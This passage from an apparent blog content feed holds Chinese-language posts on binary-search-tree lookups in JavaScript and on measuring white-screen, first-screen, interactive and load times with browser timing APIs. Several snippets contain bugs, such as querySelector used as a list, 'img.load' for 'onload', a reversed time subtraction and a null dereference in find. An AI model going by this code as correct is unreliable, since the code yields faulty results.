<h6 id="查找最小值"><a href="#查找最小值" class="headerlink" title="查找最小值"></a>查找最小值</h6><p>我们知道，二叉查找树的特性就是较小的值存储在左边，所以要找到最小的值，只需要遍历左子树到最后一个节点即可，该节点即保存着最小值：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">BST.prototype.getMin = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root</span><br><span class="line">    <span class="keyword">while</span> (current.left) &#123;</span><br><span class="line">        current = current.left</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="查找最大值"><a href="#查找最大值" class="headerlink" title="查找最大值"></a>查找最大值</h6><p>类似于查找最小值，只不过遍历的是右子树：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">BST.prototype.getMax = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root</span><br><span class="line">    <span class="keyword">while</span> (current.right) &#123;</span><br><span class="line">        current = current.right</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="查找给定值"><a href="#查找给定值" class="headerlink" title="查找给定值"></a>查找给定值</h6><p>查找给定值稍微复杂一点，算法如下：</p>
<ul>
<li>1、设当前节点为根节点，对树进行遍历</li>
<li>2、比较要查找的值是否等于当前节点的值，如果是则返回当前节点</li>
<li>3、如果要查找的值小于当前节点的值，则更新当前节点为当前节点的左节点，执行第 2 步</li>
<li>4、如果要查找的值大于当前节点的值，则更新当前节点为当前节点的右节点，执行第 2 步</li>
<li>5、未找到返回 null</li>
</ul>
<p>代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">BST.prototype.find = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.root</span><br><span class="line">    <span class="keyword">while</span> (current) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current.data === data) &#123;</span><br><span class="line">            <span class="keyword">return</span> current</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data &lt; current.data) &#123;</span><br><span class="line">            current = current.left</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data &gt; current.data) &#123;</span><br><span class="line">            current = current.right</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>性能-白屏-首屏-可操-加载完毕时间点计算方法</title>
    <url>/2018/05/11/%E6%80%A7%E8%83%BD_%E7%99%BD%E5%B1%8F-%E9%A6%96%E5%B1%8F-%E5%8F%AF%E6%93%8D-%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%AF%95%E6%97%B6%E9%97%B4%E7%82%B9%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="1-关键点"><a href="#1-关键点" class="headerlink" title="1.关键点"></a>1.关键点</h2><p>分页面、区域、浏览器、性能指标</p>
<h3 id="页面的性能指标详解："><a href="#页面的性能指标详解：" class="headerlink" title="页面的性能指标详解："></a>页面的性能指标详解：</h3><ul>
<li><code>白屏时间（first Paint Time）</code>——用户从打开页面开始到页面开始有东西呈现为止</li>
<li><code>首屏时间</code>——用户浏览器首屏内所有内容都呈现出来所花费的时间</li>
<li><code>用户可操作时间(dom Interactive)</code>——用户可以进行正常的点击、输入等操作，默认可以统计domready时间，因为通常会在这时候绑定事件操作</li>
<li><code>总下载时间</code>——页面所有资源都加载完成并呈现出来所花的时间，即页面 onload 的时间</li>
</ul>
<h3 id="确定统计起点："><a href="#确定统计起点：" class="headerlink" title="确定统计起点："></a>确定统计起点：</h3><p>　　我们需要在用户输入 URL 或者点击链接的时候就开始统计，因为这样才能衡量用户的等待时间。高端浏览器Navigation Timing接口；普通浏览器通过 cookie 记录时间戳的方式来统计，需要注意的是 Cookie 方式只能统计到站内跳转的数据。</p>
<h2 id="2-如何统计性能指标的时间"><a href="#2-如何统计性能指标的时间" class="headerlink" title="2.如何统计性能指标的时间"></a>2.如何统计性能指标的时间</h2><h3 id="2-1白屏时间"><a href="#2-1白屏时间" class="headerlink" title="2.1白屏时间"></a>2.1白屏时间</h3><h4 id="公式："><a href="#公式：" class="headerlink" title="公式："></a>公式：</h4><p><code>白屏时间 = 开始渲染耗时(首字节时间+HTML下载完成时间) + 头部资源加载耗时</code></p>
<h4 id="如何获取"><a href="#如何获取" class="headerlink" title="如何获取"></a>如何获取</h4><p><code>chrome 高版本</code><br>window.chrome.loadTimes().firstPaintTime loadTimes获取的结果<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  connectionInfo: <span class="string">"http/1"</span>,</span><br><span class="line">  finishDocumentLoadTime: <span class="number">1422412260.278667</span>,</span><br><span class="line">  finishLoadTime: <span class="number">1422412261.083637</span>,</span><br><span class="line">  firstPaintAfterLoadTime: <span class="number">1422412261.094726</span>,</span><br><span class="line">  firstPaintTime: <span class="number">1422412258.085214</span>,</span><br><span class="line">  navigationType: <span class="string">"Reload"</span>,</span><br><span class="line">  npnNegotiatedProtocol: <span class="string">"unknown"</span>,</span><br><span class="line">  requestTime: <span class="number">0</span>,</span><br><span class="line">  startLoadTime: <span class="number">1422412256.920803</span>,</span><br><span class="line">  wasAlternateProtocolAvailable: <span class="literal">false</span>,</span><br><span class="line">  wasFetchedViaSpdy: <span class="literal">false</span>,</span><br><span class="line">  wasNpnNegotiated: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="所以计算公式："><a href="#所以计算公式：" class="headerlink" title="所以计算公式："></a>所以计算公式：</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">window</span>.chrome.loadTimes().firstPaintTime - <span class="built_in">window</span>.chrome.loadTimes().startLoadTime)*<span class="number">1000</span></span><br></pre></td></tr></table></figure>
<h4 id="其他浏览器："><a href="#其他浏览器：" class="headerlink" title="其他浏览器："></a>其他浏览器：</h4><p>大部分浏览器没有特定函数，必须想其他办法来监测。仔细观察 WebPagetest 视图分析发现，白屏时间出现在头部外链资源加载完附近，因为浏览器只有加载并解析完头部资源才会真正渲染页面。基于此我们可以通过获取头部资源加载完的时刻来近似统计白屏时间。尽管并不精确，但却考虑了影响白屏的主要因素：首字节时间和头部资源加载时间（HTML下载完成时间非常微小）。<br><img src="/static/img/831429-20160818152709875-413996193.png" width="900"><br><code>有一个点:mod_36ad799.js等几个js为什么会在hm.js之前下载？html代码如下</code><br><img src="/static/img/831429-20160818134727843-1783499542.png" width="900"><br>这貌似与我们熟知的脚本阻塞解析不符啊，理应是脚本插入hm.js在先，导致DOM树改变，重新绘制DOM树，然后继续往下解析……原因是现在的浏览器对这个过程做了优化：</p>
<h5 id="处理脚本及样式表的顺序（The-order-of-processing-scripts-and-style-sheets）"><a href="#处理脚本及样式表的顺序（The-order-of-processing-scripts-and-style-sheets）" class="headerlink" title="处理脚本及样式表的顺序（The order of processing scripts and style sheets）"></a>处理脚本及样式表的顺序（The order of processing scripts and style sheets）</h5><ul>
<li><p>脚本</p>
<ul>
<li>web的模式是同步的，开发者希望解析到一个script标签时立即解析执行脚本，并阻塞文档的解析直到脚本执行完。如果脚本是外引的，则网络必须先请求到这个资源——这个过程也是同步的，会阻塞文档的解析直到资源被请求到。这个模式保持了很多年，并且在html4及html5中都特别指定了。开发者可以将脚本标识为defer，以使其不阻塞文档解析，并在文档解析结束后执行。Html5增加了标记脚本为异步的选项，以使脚本的解析执行使用另一个线程。</li>
</ul>
</li>
<li><p>预解析（Speculative parsing）</p>
<ul>
<li>Webkit和Firefox都做了这个优化，当执行脚本时，另一个线程解析剩下的文档，并加载后面需要通过网络加载的资源。这种方式可以使资源并行加载从而使整体速度更快。需要注意的是，预解析并不改变Dom树，它将这个工作留给主解析过程，自己只解析外部资源的引用，比如外部脚本、样式表及图片。</li>
</ul>
</li>
<li><p>样式表（Style sheets）</p>
<ul>
<li>样式表采用另一种不同的模式。理论上，既然样式表不改变Dom树，也就没有必要停下文档的解析等待它们，然而，存在一个问题，脚本可能在文档的解析过程中请求样式信息，如果样式还没有加载和解析，脚本将得到错误的值，显然这将会导致很多问题，这看起来是个边缘情况，但确实很常见。Firefox在存在样式表还在加载和解析时阻塞所有的脚本，而Chrome只在当脚本试图访问某些可能被未加载的样式表所影响的特定的样式属性时才阻塞这些脚本。</li>
</ul>
</li>
</ul>
<p>所以就得到了上面的那个结果</p>
<p>看看IE的处理<br><img src="/static/img/831429-20160818134727843-1783499542.png" width="900"></p>
<p>回归正题，普通浏览器需要获取两个时间：<code>开始渲染耗时</code>和<code>头部资源加载耗时</code>：</p>
<p>开始渲染时间：</p>
<p>需要借助浏览器的<code>navigator timing</code>属性<code>performance；</code> <code>window.performance.timing</code>（Navigation timing性能时间线） 相关属性：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等</span></span><br><span class="line">navigationStart: <span class="number">1441112691935</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0</span></span><br><span class="line">unloadEventStart: <span class="number">0</span>,</span><br><span class="line">unloadEventEnd: <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0</span></span><br><span class="line">redirectStart: <span class="number">0</span>,</span><br><span class="line">redirectEnd: <span class="number">0</span>,</span><br><span class="line"> ...</span><br><span class="line"> <span class="comment">// 开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件</span></span><br><span class="line">domLoading: <span class="number">1441112692690</span>,</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> timing = performance.timing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> loadingTime = timing .domLoading - timing.navigationStart;<span class="comment">//开始渲染时间</span></span><br></pre></td></tr></table></figure>
<p>看一下navigator timing浏览器支持情况</p>
<table>
<thead>
<tr>
<th>规范</th>
<th>IE</th>
<th>Firefox</th>
<th>chrome</th>
<th>Safari</th>
<th>Opera</th>
<th>iOS Safari</th>
<th>Android</th>
</tr>
</thead>
<tbody>
<tr>
<td>Navigation Timing</td>
<td>9</td>
<td>31</td>
<td>全部</td>
<td>8</td>
<td>26</td>
<td>8（不包括8.1）</td>
<td>4.1</td>
</tr>
</tbody>
</table>
<p>对于IE等低版本浏览器是不行的。</p>
<p>IE8 等低版本浏览器 通过 cookie 记录时间戳的方式来统计，需要注意的是 Cookie 方式只能统计到站内跳转的数据。 首次进入没有好的统计方法。</p>
<p>头部资源加载时间：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> start_time = +<span class="keyword">new</span> <span class="built_in">Date</span>; <span class="comment">//测试时间起点，实际统计起点为 DNS 查询</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3s 后这个 js 才会返回 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"script.php"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> end_time = +<span class="keyword">new</span> <span class="built_in">Date</span>; <span class="comment">//时间终点</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> headtime = end_time - start_time; <span class="comment">//头部资源加载时间</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(headtime);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>在头部资源加载完之前页面将是白屏<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>script.php 被模拟设置 3s 后返回，head 底部内嵌 JS 等待前面 js 返回后才执行<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>script.php 替换成一个执行长时间循环的 js 效果也一样<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这个比较简单，在head的前面计时开始，在head最末尾计时结束，中间的差值就计算为头部资源加载时间。</p>
<p>所以，<code>最终计算方法:</code><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstPaintTime = end_time - performance.timing.navigationStart</span><br></pre></td></tr></table></figure></p>
<h3 id="首屏时间"><a href="#首屏时间" class="headerlink" title="首屏时间"></a>首屏时间</h3><ul>
<li><p>首屏时间的统计比较复杂，因为涉及图片等多种元素及异步渲染等方式。观察加载视图可发现，影响首屏的主要因素的图片的加载。通过统计首屏内图片的加载时间便可以获取首屏渲染完成的时间。统计流程如下：</p>
</li>
<li><p>首屏位置调用 API 开始统计 -&gt; 绑定首屏内所有图片的 load 事件 -&gt; 页面加载完后判断图片是否在首屏内，找出加载最慢的一张 -&gt; 首屏时间</p>
</li>
<li><p>这是同步加载情况下的简单统计逻辑，另外需要注意的几点：</p>
</li>
<li><p>页面存在 iframe 的情况下也需要判断加载时间</p>
</li>
<li>gif 图片在 IE 上可能重复触发 load 事件需排除</li>
<li>异步渲染的情况下应在异步获取数据插入之后再计算首屏</li>
<li>css 重要背景图片可以通过 JS 请求图片 url 来统计(浏览器不会重复加载)</li>
<li>没有图片则以统计 JS 执行时间为首屏，即认为文字出现时间<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//IE gif重复onload解决</span></span><br><span class="line"><span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">img.load=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//do something</span></span><br><span class="line">img.load=<span class="literal">null</span>;<span class="comment">//重新赋值为null</span></span><br><span class="line">&#125;</span><br><span class="line">img.src=<span class="string">'××.gif'</span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="统计方法1"><a href="#统计方法1" class="headerlink" title="统计方法1:"></a>统计方法1:</h4><p>原理：在首屏渲染之前埋上处理逻辑，使用定时器不断的去检测img节点的图片。判断图片是否在首屏和加载完成，找到首屏中加载时间最慢的的图片完成的时间，从而计算出首屏时间。如果首屏有没有图片，如果没图片就用domready时间。</p>
<p>缺点： 1.浏览器定时器最大精度为55ms 2.背景图片加载没有计算在内 3.不断检测并执行的脚本耗时<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1,获取首屏基线高度</span></span><br><span class="line"><span class="comment">//2,计算出基线dom元素之上的所有图片元素</span></span><br><span class="line"><span class="comment">//3,所有图片onload之后为首屏显示时间</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getOffsetTop</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> offsetTop = ele.offsetTop;</span><br><span class="line">    <span class="keyword">if</span> (ele.offsetParent !== <span class="literal">null</span>) &#123;</span><br><span class="line">      offsetTop += getOffsetTop(ele.offsetParent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> offsetTop;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> firstScreenHeight = win.screen.height;</span><br><span class="line">  <span class="keyword">var</span> firstScreenImgs = [];</span><br><span class="line">  <span class="keyword">var</span> isFindLastImg = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> allImgLoaded = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> t = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i, img;</span><br><span class="line">    <span class="keyword">if</span> (isFindLastImg) &#123;</span><br><span class="line">      <span class="keyword">if</span> (firstScreenImgs.length) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; firstScreenImgs.length; i++) &#123;</span><br><span class="line">          img = firstScreenImgs[i];</span><br><span class="line">          <span class="keyword">if</span> (!img.complete) &#123;</span><br><span class="line">            allImgLoaded = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            allImgLoaded = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        allImgLoaded = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (allImgLoaded) &#123;</span><br><span class="line">        collect.add(&#123;</span><br><span class="line">          firstScreenLoaded: startTime - <span class="built_in">Date</span>.now()</span><br><span class="line">        &#125;);</span><br><span class="line">        clearInterval(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> imgs = body.querySelector(<span class="string">'img'</span>);</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; imgs.length; i++) &#123;</span><br><span class="line">        img = imgs[i];</span><br><span class="line">        <span class="keyword">var</span> imgOffsetTop = getOffsetTop(img);</span><br><span class="line">        <span class="keyword">if</span> (imgOffsetTop &gt; firstScreenHeight) &#123;</span><br><span class="line">          isFindLastImg = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (imgOffsetTop &lt;= firstScreenHeight</span><br><span class="line">           &amp;&amp; !img.hasPushed) &#123;</span><br><span class="line">          img.hasPushed = <span class="number">1</span>;</span><br><span class="line">          firstScreenImgs.push(img);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  doc.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> imgs = body.querySelector(<span class="string">'img'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!imgs.length) &#123;</span><br><span class="line">      isFindLastImg = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  win.addEventListener(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    allImgLoaded = <span class="literal">true</span>;</span><br><span class="line">    isFindLastImg = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (t) &#123;</span><br><span class="line">      clearInterval(t);</span><br><span class="line">    &#125;</span><br><span class="line">    collect.log(collect.global);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></p>
<h4 id="统计方法2："><a href="#统计方法2：" class="headerlink" title="统计方法2："></a>统计方法2：</h4><p>原理：对于网页高度小于屏幕的网站来说，只要在页面底部加上脚本打印当前时间即可；或者对于网页高度大于一屏的网页来说，只要在估算接近于一屏幕的元素的位置后，打印一下当前时间。当然这个时间要得把首屏中所有图片的加载时间也算上。</p>
<p>缺点： 1.需要每个页面手动加入到对应位置 2.背景图片加载没有计算在内<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,minimum-scale=1.0,maximum-scale=1.0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.logInfo = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.logInfo.openTime = performance.timing.navigationStart;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>这是第一屏，这是第一屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>第一屏结尾，第一屏结尾<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">            (<span class="function"><span class="keyword">function</span> <span class="title">logFirstScreen</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> images = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> iLen = images.length;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> curMax = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> inScreenLen = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 图片的加载回调</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">imageBack</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.removeEventListener</span></span><br><span class="line"><span class="javascript">                    &amp;&amp; <span class="keyword">this</span>.removeEventListener(<span class="string">'load'</span>, imageBack, !<span class="number">1</span>);</span></span><br><span class="line">                    if (++curMax === inScreenLen) &#123;</span><br><span class="line"><span class="javascript">                        <span class="comment">// 如果所有在首屏的图片均已加载完成了的话，发送日志</span></span></span><br><span class="line">                        log();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="comment">// 对于所有的位于指定区域的图片，绑定回调事件</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> s = <span class="number">0</span>; s &lt; iLen; s++) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> img = images[s];</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> offset = &#123;</span></span><br><span class="line">                        top: 0</span><br><span class="line">                    &#125;;</span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> curImg = img;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">while</span> (curImg.offsetParent) &#123;</span></span><br><span class="line">                        offset.top += curImg.offsetTop;</span><br><span class="line">                        curImg = curImg.offsetParent;</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="comment">// 判断图片在不在首屏</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">document</span>.documentElement.clientHeight &lt; offset.top) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">continue</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="comment">// 图片还没有加载完成的话</span></span></span><br><span class="line">                    if (!img.complete) &#123;</span><br><span class="line">                        inScreenLen++;</span><br><span class="line"><span class="javascript">                        img.addEventListener(<span class="string">'load'</span>, imageBack, !<span class="number">1</span>);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="comment">// 如果首屏没有图片的话，直接发送日志</span></span></span><br><span class="line">                if (inScreenLen === 0) &#123;</span><br><span class="line">                    log();</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="comment">// 发送日志进行统计</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">log</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">window</span>.logInfo.firstScreen = +<span class="keyword">new</span> <span class="built_in">Date</span>() - <span class="built_in">window</span>.logInfo.openTime;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="string">'首屏时间：'</span>, <span class="built_in">window</span>.logInfo.firstScreen + <span class="string">'ms'</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)();</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2-3统计用户可操作"><a href="#2-3统计用户可操作" class="headerlink" title="2.3统计用户可操作"></a>2.3统计用户可操作</h3><ul>
<li><p>用户可操作为所有DOM都解析完毕的时间，默认可以统计domready时间，因为通常会在这时候绑定事件操作。对于使用了模块化异步加载的 JS 可以在代码中去主动标记重要 JS 的加载时间，这也是产品指标的统计方式。</p>
</li>
<li><p>使用jquery中的$(document).ready()即是此意义 window.performance.timing.domInteractive window.performance.timing.domContentLoadedEventStart</p>
<h4 id="计算公式："><a href="#计算公式：" class="headerlink" title="计算公式："></a>计算公式：</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">performance.timing.domInteractive - performance.timing.navigationStart</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-4总下载时间"><a href="#2-4总下载时间" class="headerlink" title="2.4总下载时间"></a>2.4总下载时间</h3><p>默认可以统计onload时间，这样可以统计同步加载的资源全部加载完的耗时。如果页面中存在很多异步渲染，可以将异步渲染全部完成的时间作为总下载时间。</p>
<h4 id="计算公式：-1"><a href="#计算公式：-1" class="headerlink" title="计算公式："></a>计算公式：</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">performance.timing.loadEventStart- performance.timing.navigationStart</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>白屏</tag>
        <tag>首屏</tag>
        <tag>可操，onload</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-数据结构的概念以及相关术语</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD/</url>
